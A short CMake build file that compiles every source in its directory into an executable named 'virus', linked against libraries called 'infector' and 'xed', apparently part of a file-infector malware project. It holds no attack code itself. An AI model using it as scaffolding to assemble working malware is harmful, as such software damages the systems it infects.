cmake_minimum_required(VERSION 3.2)

aux_source_directory(./ VIRUS_FILES)

add_executable(virus ${VIRUS_FILES})

target_link_libraries(virus infector)
target_link_libraries(virus xed)